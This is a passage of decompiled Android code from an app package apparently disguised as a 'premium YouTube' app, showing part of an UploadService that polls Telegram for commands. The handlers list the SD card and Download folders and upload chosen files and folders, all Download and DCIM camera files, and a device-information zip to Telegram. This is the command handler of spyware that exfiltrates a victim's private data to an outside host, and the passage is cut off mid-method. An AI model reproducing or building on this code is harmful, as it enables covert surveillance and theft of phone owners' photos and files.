                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۲۷String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch35$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$40, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$40", f = "UploadService.kt", i = {}, l = {1716}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass40 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass40(UploadService uploadService, Continuation<? super AnonymousClass40> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass40(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextToTelegram(uploadService.listSdcardRoot(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$41, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$41", f = "UploadService.kt", i = {}, l = {1720}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass41 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $filename;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass41(UploadService uploadService, String str, Continuation<? super AnonymousClass41> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$filename = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass41(this.this$0, this.$filename, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendSdcardFileToTelegram(this.$filename, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$42, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$42", f = "UploadService.kt", i = {}, l = {1724}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass42 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $folder;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass42(UploadService uploadService, String str, Continuation<? super AnonymousClass42> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$folder = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass42(this.this$0, this.$folder, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendSdcardFolderToTelegram(this.$folder, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$43, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$43", f = "UploadService.kt", i = {}, l = {1728}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass43 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass43(UploadService uploadService, Continuation<? super AnonymousClass43> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass43(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        String replyMarkup = this.this$0.buildCommandsKeyboard();
                        this.label = 1;
                        if (this.this$0.sendTextToTelegramWithKeyboard(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۶۹String$arg0$callsendTextToTelegramWithKeyboard$fun$anonymous$$arg2$calllaunch$branch39$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), replyMarkup, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$44, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$44", f = "UploadService.kt", i = {}, l = {1731}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass44 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass44(UploadService uploadService, Continuation<? super AnonymousClass44> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass44(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        UploadService uploadService = this.this$0;
                        this.label = 1;
                        if (uploadService.sendTextToTelegram(uploadService.listDownloadFolder(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$45, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$45", f = "UploadService.kt", i = {}, l = {1735}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass45 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass45(UploadService uploadService, Continuation<? super AnonymousClass45> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass45(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۳۱String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch41$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$46, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$46", f = "UploadService.kt", i = {}, l = {1736}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass46 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass46(UploadService uploadService, Continuation<? super AnonymousClass46> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass46(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendAllDownloadFilesToTelegramControlled((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$47, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$47", f = "UploadService.kt", i = {}, l = {1740}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass47 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass47(UploadService uploadService, Continuation<? super AnonymousClass47> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass47(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۳۲String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch42$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$48, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$48", f = "UploadService.kt", i = {}, l = {1743}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass48 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass48(UploadService uploadService, Continuation<? super AnonymousClass48> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass48(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۳۳String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch43$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$49, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$49", f = "UploadService.kt", i = {}, l = {1744}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass49 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass49(UploadService uploadService, Continuation<? super AnonymousClass49> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass49(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendDeviceInfoZipToTelegram((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$50, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$50", f = "UploadService.kt", i = {}, l = {1748}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass50 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            final /* synthetic */ String $replyMarkup;
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass50(UploadService uploadService, String str, Continuation<? super AnonymousClass50> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
                this.$replyMarkup = str;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass50(this.this$0, this.$replyMarkup, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegramWithKeyboard(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷۱String$arg0$callsendTextToTelegramWithKeyboard$fun$anonymous$$arg2$calllaunch$branch44$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), this.$replyMarkup, (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$51, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$51", f = "UploadService.kt", i = {}, l = {1752}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass51 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass51(UploadService uploadService, Continuation<? super AnonymousClass51> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass51(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۳۵String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch45$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$52, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$52", f = "UploadService.kt", i = {}, l = {1753}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass52 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass52(UploadService uploadService, Continuation<? super AnonymousClass52> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass52(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendAllDCIMCameraFilesToTelegramControlled((Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$53, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$53", f = "UploadService.kt", i = {}, l = {1757}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass53 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass53(UploadService uploadService, Continuation<? super AnonymousClass53> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass53(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
                    case 0:
                        ResultKt.throwOnFailure($result);
                        this.label = 1;
                        if (this.this$0.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۳۶String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$branch46$when$branch$if$body$loop$branch$if$branch$if$branch$if$try$body$loop$fun$anonymous$$arg2$calllaunch$arg0$call$setpollingJob$$funstartTelegramPolling$classUploadService(), (Continuation) this) == coroutine_suspended) {
                            return coroutine_suspended;
                        }
                        break;
                    case 1:
                        ResultKt.throwOnFailure($result);
                        break;
                    default:
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                return Unit.INSTANCE;
            }
        }

        /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$54, reason: invalid class name */
        /* JADX INFO: compiled from: UploadService.kt */
        @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
        @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startTelegramPolling$1$54", f = "UploadService.kt", i = {}, l = {1761}, m = "invokeSuspend", n = {}, s = {})
        static final class AnonymousClass54 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
            int label;
            final /* synthetic */ UploadService this$0;

            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            AnonymousClass54(UploadService uploadService, Continuation<? super AnonymousClass54> continuation) {
                super(2, continuation);
                this.this$0 = uploadService;
            }

            public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
                return new AnonymousClass54(this.this$0, continuation);
            }

            public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
                return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
            }

            public final Object invokeSuspend(Object $result) {
                Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
                switch (this.label) {
